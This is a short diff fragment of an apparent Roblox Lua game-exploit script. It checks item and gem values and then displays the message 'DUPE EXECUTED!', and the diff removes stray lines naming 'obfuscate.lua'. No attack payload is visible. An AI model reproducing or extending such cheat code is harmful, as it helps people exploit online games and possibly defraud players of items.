@@ -385,5 +385,3 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
     local message = require(game.ReplicatedStorage.Library.Client.Message)
     message.Error("DUPE EXECUTED!")
 end
-obfuscate.lua
-12 KB
